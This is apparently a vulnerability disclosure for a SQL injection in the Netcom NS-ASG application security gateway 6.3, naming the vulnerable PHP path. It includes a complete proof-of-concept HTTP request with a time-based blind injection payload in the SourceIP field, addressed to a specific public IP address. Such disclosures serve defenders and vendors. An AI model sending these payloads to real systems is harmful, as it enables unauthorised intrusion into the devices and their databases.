Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3

Vulnerability Path ： /protocol/firewall/addfirewall.php

As shown in the figure, the value of the $FireWallTableArray array will be accepted, including the following elements, in which $SourceIP will be substituted into the sql statement in the figure below and executed without any restrictions.
<img width="601" alt="图片" src="https://github.com/hundanchen69/cve/assets/124319989/11ef2010-7d58-4a6b-a7f3-35484d07c993">

Poc：

```
POST /protocol/index.php HTTP/1.1
Host: 1.85.53.53:443
Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 231

jsoncontent={"protocolType":"addfirewall","messagecontent":["{\"FireWallId\":\"1\",\"SourceIP\":\"192.168.1.101'/**/and/**/(select*from(select(sleep(20)))a)='\",\"DestIP\":\"192.168.1.101*\",\"Protocol\":\"1*\",\"Port\":\"80*\"}"]}

```
<img width="614" alt="图片" src="https://github.com/hundanchen69/cve/assets/124319989/ba060ec4-9c64-48bd-85a0-ae984f4eef42">
<img width="608" alt="图片" src="https://github.com/hundanchen69/cve/assets/124319989/c3f51e14-059e-4142-bc15-c3e8aacad43b">

